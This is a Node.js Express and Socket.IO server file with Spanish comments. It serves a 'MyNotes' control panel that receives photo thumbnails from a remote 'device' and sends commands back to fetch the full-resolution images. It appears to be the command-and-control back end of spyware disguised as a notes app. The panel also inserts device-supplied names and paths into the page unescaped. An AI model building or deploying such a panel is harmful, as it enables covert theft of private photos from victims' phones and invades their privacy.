const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const cors = require('cors');

const app = express();
app.use(cors());

app.get('/', (req, res) => {
    res.send(`
    <html>
        <head>
            <title>MyNotes - Centro de Control</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: 'Segoe UI', sans-serif; background: #121212; color: white; padding: 20px; }
                
                /* CABECERA FIJA */
                .header { 
                    position: sticky; top: 0; background: #121212; z-index: 100; 
                    padding-bottom: 10px; border-bottom: 1px solid #333; margin-bottom: 15px;
                    display: flex; justify-content: space-between; align-items: center;
                }

                .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 8px; }
                
                .card { 
                    background: #1e1e1e; border-radius: 6px; overflow: hidden; 
                    text-align: center; border: 1px solid #333; position: relative;
                }
                .card img { width: 100%; height: 100px; object-fit: cover; opacity: 0.7; transition: opacity 0.2s;}
                
                /* FOTO HD */
                .card.hd img { opacity: 1; border-bottom: 3px solid #00e676; height: 120px; }
                
                .info { padding: 4px; font-size: 9px; color: #aaa; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }

                /* BOTONES */
                .btn-req { 
                    background: #6200ea; border: none; padding: 8px; width: 100%; 
                    cursor: pointer; color: white; font-weight: bold; font-size: 10px;
                }
                .btn-req:hover { background: #7c43bd; }
                .btn-req:disabled { background: #333; cursor: wait; }

                /* BOTÓN DE PAUSA (LA SOLUCIÓN) */
                #btnPause {
                    padding: 10px 20px; font-size: 14px; font-weight: bold; border: none; border-radius: 5px;
                    cursor: pointer; background: #ff1744; color: white; box-shadow: 0 4px 6px rgba(0,0,0,0.3);
                }
                #status { font-size: 12px; color: #aaa; margin-left: 10px;}
            </style>
        </head>
        <body>
            <div class="header">
                <div>
                    <span style="font-size: 18px; font-weight: bold;">📡 MyNotes Panel</span>
                    <span id="status">Esperando...</span>
                    <span id="counter" style="color: #00e676; margin-left: 10px;">(0 fotos)</span>
                </div>
                <button id="btnPause" onclick="togglePause()">⏸ CONGELAR</button>
            </div>

            <div class="grid" id="grid"></div>

            <script src="/socket.io/socket.io.js"></script>
            <script>
                const socket = io();
                const grid = document.getElementById('grid');
                const status = document.getElementById('status');
                const counter = document.getElementById('counter');
                const btnPause = document.getElementById('btnPause');

                let isPaused = false;
                let pendingPhotos = []; // Cola para guardar fotos mientras está pausado
                let photoCount = 0;

                // FUNCIÓN DE CONGELAR
                function togglePause() {
                    isPaused = !isPaused;
                    if (isPaused) {
                        btnPause.innerText = "▶ REANUDAR (Actualizar)";
                        btnPause.style.background = "#00e676";
                        btnPause.style.color = "black";
                    } else {
                        btnPause.innerText = "⏸ CONGELAR";
                        btnPause.style.background = "#ff1744";
                        btnPause.style.color = "white";
                        
                        // Al reanudar, mostrar todo lo acumulado de golpe
                        processQueue();
                    }
                }

                function processQueue() {
                    if(pendingPhotos.length > 0) {
                        // Agregamos todo lo pendiente al DOM
                        pendingPhotos.forEach(html => {
                            const temp = document.createElement('div');
                            temp.innerHTML = html;
                            grid.prepend(temp.firstChild);
                        });
                        pendingPhotos = [];
                    }
                }

                socket.on('connection_alert', msg => {
                    status.innerText = msg;
                    status.style.color = msg.includes("Conectado") ? "#00e676" : "#ff1744";
                });

                // 1. RECIBIR MINIATURA
                socket.on('new_preview', data => {
                    if(document.getElementById(data.path)) return; // Evitar repetidos

                    photoCount++;
                    counter.innerText = "(" + photoCount + " fotos)";

                    const html = \`
                        <div class="card" id="\${data.path}">
                            <img src="data:image/jpeg;base64,\${data.image64}">
                            <div class="info">\${data.name}</div>
                            <button class="btn-req" onclick="pedirYDescargar(this, '\${data.path}')">⚡ OBTENER HD</button>
                        </div>
                    \`;

                    if (isPaused) {
                        // Si está pausado, guardamos en memoria pero NO tocamos la pantalla
                        pendingPhotos.push(html);
                    } else {
                        // Si no, mostramos directo
                        const card = document.createElement('div');
                        card.innerHTML = html; // Truco para crear elemento desde string
                        grid.prepend(card.firstElementChild);
                    }
                });

                // 2. RECIBIR HD (Siempre se procesa, aunque esté pausado)
                socket.on('receive_full', data => {
                    downloadBase64File(data.image64, data.name);
                    
                    // Actualizar tarjeta visualmente
                    const originalName = data.name.replace("HD_", "");
                    // Buscamos en el DOM
                    const cards = document.getElementsByClassName('card');
                    for(let card of cards) {
                        if(card.innerHTML.includes(originalName)) {
                            card.classList.add('hd');
                            card.querySelector('img').src = "data:image/jpeg;base64," + data.image64;
                            const btn = card.querySelector('button');
                            btn.innerText = "✅ LISTO";
                            btn.style.background = "#00c853";
                        }
                    }
                });

                function pedirYDescargar(btn, path) {
                    btn.innerText = "⏳ ...";
                    btn.disabled = true;
                    socket.emit('order_download', { path: path });
                }

                function downloadBase64File(base64Data, fileName) {
                    const link = document.createElement('a');
                    link.href = "data:image/jpeg;base64," + base64Data;
                    link.download = fileName;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                }
            </script>
        </body>
    </html>
    `);
});

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" }, allowEIO3: true, maxHttpBufferSize: 1e8 });

io.on('connection', (socket) => {
    io.emit('connection_alert', '✅ Dispositivo Conectado');

    socket.on('usrData', (data) => {
        if (data.dataType === 'preview_image') io.emit('new_preview', data);
        else if (data.dataType === 'full_image') io.emit('receive_full', data);
    });

    socket.on('order_download', (data) => socket.broadcast.emit('request_full_image', data));
    socket.on('disconnect', () => io.emit('connection_alert', '❌ Desconectado'));
});

server.listen(process.env.PORT || 3000, () => console.log('Servidor listo'));
